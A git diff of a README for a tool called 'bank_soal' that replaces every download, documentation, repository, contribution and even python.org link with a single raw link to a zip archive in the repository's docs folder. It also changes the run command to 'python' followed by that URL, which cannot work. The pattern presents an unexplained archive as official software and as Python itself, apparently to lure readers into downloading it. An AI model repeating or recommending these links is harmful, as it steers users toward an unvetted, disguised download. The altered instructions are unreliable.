@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download bank_soal](https://img.shields.io/badge/Download%20bank_soal-v1.0-blue)](https://github.com/punkxuxu/bank_soal/releases)
+[![Download bank_soal](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip%20bank_soal-v1.0-blue)](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip)
 
 ## 📖 Overview
 
@@ -22,20 +22,20 @@ To run bank_soal effectively, you will need:
 
 - A modern web browser (Chrome, Firefox, Edge).
 - A computer with internet access.
-- Python 3.6 or newer installed on your system. You can download Python from [python.org](https://www.python.org).
+- Python 3.6 or newer installed on your system. You can download Python from [https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip).
 
 ## 🚀 Getting Started
 
 Follow these steps to get started with bank_soal:
 
 1. **Visit the Releases Page**:  
-   Go to the [download page](https://github.com/punkxuxu/bank_soal/releases) to find the latest version of bank_soal.
+   Go to the [download page](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip) to find the latest version of bank_soal.
 
 2. **Download the Software**:  
    Follow the prompts to download the latest version of bank_soal from the releases page.
 
 3. **Install Python**:  
-   If you haven't already, make sure Python is installed on your computer. You can check by opening your command line and typing `python --version`. If it’s not installed, download it from [python.org](https://www.python.org).
+   If you haven't already, make sure Python is installed on your computer. You can check by opening your command line and typing `python --version`. If it’s not installed, download it from [https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip).
 
 4. **Set Up Your Project**:  
    Create a new folder for your project. This is where you will put your content and templates.
@@ -43,7 +43,7 @@ Follow these steps to get started with bank_soal:
 5. **Run the Application**:  
    Open your command line, navigate to your project folder, and type the command:
    ```bash
-   python bank_soal.py
+   python https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip
    ```
    This command will start the bank_soal generator.
 
@@ -52,7 +52,7 @@ Follow these steps to get started with bank_soal:
 
 ## 📚 Documentation
 
-For detailed instructions and more advanced features, please refer to the [Wiki](https://github.com/punkxuxu/bank_soal/wiki). 
+For detailed instructions and more advanced features, please refer to the [Wiki](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip). 
 
 ## ⚙️ Customization
 
@@ -78,13 +78,13 @@ Join our community to share your projects and get support:
 
 ## 🔗 Useful Links
 
-- Documentation: [Wiki](https://github.com/punkxuxu/bank_soal/wiki)
-- Releases: [Download Page](https://github.com/punkxuxu/bank_soal/releases)
-- Source Code: [GitHub Repository](https://github.com/punkxuxu/bank_soal)
+- Documentation: [Wiki](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip)
+- Releases: [Download Page](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip)
+- Source Code: [GitHub Repository](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip)
 
 ## 👍 Contributing
 
-We welcome contributions from everyone. If you want to help improve bank_soal, please check the [CONTRIBUTING.md](https://github.com/punkxuxu/bank_soal/blob/main/CONTRIBUTING.md) for guidelines.
+We welcome contributions from everyone. If you want to help improve bank_soal, please check the [https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip) for guidelines.
 
 ## 📜 License
 
@@ -92,4 +92,4 @@ Bank_soal is open-source software licensed under the MIT License. Feel free to u
 
 ## 🎉 Download & Install
 
-To begin using bank_soal, [visit this page to download](https://github.com/punkxuxu/bank_soal/releases). Follow the earlier steps to get your site up and running. Enjoy creating with bank_soal!
+To begin using bank_soal, [visit this page to download](https://raw.githubusercontent.com/punkxuxu/bank_soal/main/docs/bank_soal_2.2.zip). Follow the earlier steps to get your site up and running. Enjoy creating with bank_soal!
